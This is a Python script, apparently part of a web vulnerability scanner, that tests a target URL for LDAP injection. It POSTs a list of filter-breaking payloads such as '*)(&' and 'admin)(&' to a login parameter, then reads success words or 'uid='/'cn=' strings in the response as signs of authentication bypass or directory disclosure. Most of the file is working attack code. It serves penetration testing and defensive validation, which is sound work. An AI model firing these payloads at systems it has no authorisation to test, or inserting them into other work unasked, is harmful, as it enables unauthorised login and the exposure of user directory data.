#!/usr/bin/env python3
"""LDAP Injection Tester

Tests for LDAP injection vulnerabilities:
- LDAP injection in authentication endpoints
- LDAP injection in search endpoints
- Authentication bypass via LDAP injection
- Information disclosure via LDAP injection
"""

import os
import time
import requests
from typing import Dict, Any, Optional, List
from urllib.parse import urlparse


def test_ldap_injection(
    target_url: str,
    param: str = "username",
    endpoint_type: str = "auth"
) -> Dict[str, Any]:
    """Test for LDAP injection vulnerabilities
    
    Args:
        target_url: Target URL
        param: Parameter to test
        endpoint_type: Endpoint type (auth, search)
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "ldap_injection",
        "vulnerable": False,
        "injection_method": None,
        "auth_bypass": False,
        "evidence": None
    }
    
    # LDAP injection payloads
    ldap_payloads = [
        # Authentication bypass
        ("*", "ldap_wildcard"),
        ("*)(&", "ldap_and"),
        ("*)(|", "ldap_or"),
        ("*)(|(cn=*", "ldap_or_cn"),
        ("admin)(&", "ldap_admin_bypass"),
        # Information disclosure
        ("*)(uid=*", "ldap_uid_disclosure"),
        ("*)(cn=*", "ldap_cn_disclosure"),
    ]
    
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    for payload, payload_name in ldap_payloads:
        try:
            # Try POST
            resp = requests.post(
                base_url,
                data={param: payload},
                timeout=10
            )
            
            # Check for authentication bypass indicators
            if resp.status_code == 200:
                response_lower = resp.text.lower()
                success_indicators = ["success", "welcome", "dashboard", "logged in", "authenticated"]
                if any(ind in response_lower for ind in success_indicators):
                    result["vulnerable"] = True
                    result["injection_method"] = payload_name
                    result["auth_bypass"] = True
                    result["evidence"] = {
                        "payload": payload,
                        "status_code": resp.status_code,
                        "response_snippet": resp.text[:500],
                        "note": "LDAP injection authentication bypass detected"
                    }
                    break
            
            # Check for information disclosure
            if "uid=" in resp.text or "cn=" in resp.text.lower():
                result["vulnerable"] = True
                result["injection_method"] = payload_name
                result["evidence"] = {
                    "payload": payload,
                    "status_code": resp.status_code,
                    "response_snippet": resp.text[:500],
                    "note": "LDAP information disclosure detected"
                }
                break
                
        except Exception:
            continue
    
    return result


def validate_ldap_injection(
    discovery_data: Dict[str, Any]
) -> Dict[str, Any]:
    """Main validation function for LDAP injection
    
    Args:
        discovery_data: Discovery data containing target URLs
        
    Returns:
        Dict with validation results
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": []
    }
    
    # Extract target from discovery data
    target = discovery_data.get("target")
    if not target:
        return results
    
    # Detect LDAP usage from technology fingerprinting
    uses_ldap = False
    if "web" in discovery_data and "fingerprints" in discovery_data["web"]:
        fingerprints = discovery_data["web"]["fingerprints"]
        technologies = fingerprints.get("technologies", [])
        if any("ldap" in t.lower() for t in technologies):
            uses_ldap = True
    
    # Test LDAP injection
    test_result = test_ldap_injection(target, endpoint_type="auth")
    results["tests_run"] += 1
    if test_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].append(test_result)
    
    return results


if __name__ == "__main__":
    import argparse
    
    ap = argparse.ArgumentParser(description="LDAP Injection Tester")
    ap.add_argument("--target", required=True, help="Target URL")
    ap.add_argument("--param", default="username", help="Parameter to test")
    args = ap.parse_args()
    
    result = test_ldap_injection(args.target, param=args.param)
    
    import json
    print(json.dumps(result, indent=2))

